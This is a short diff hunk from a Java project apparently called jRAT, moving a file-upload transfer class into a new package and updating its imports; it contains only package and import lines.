@@ -1,11 +1,11 @@
-package jrat.controller.threads;
+package jrat.module.fs;
 
 import jrat.common.TransferRunnable;
 import jrat.common.io.TransferData;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet103CompleteServerUpload;
 import jrat.controller.packets.outgoing.Packet104ServerUploadPart;
-import jrat.controller.ui.panels.PanelFileTransfers;
+import jrat.module.fs.ui.PanelFileTransfers;
 
 import java.io.File;
 import java.io.FileInputStream;
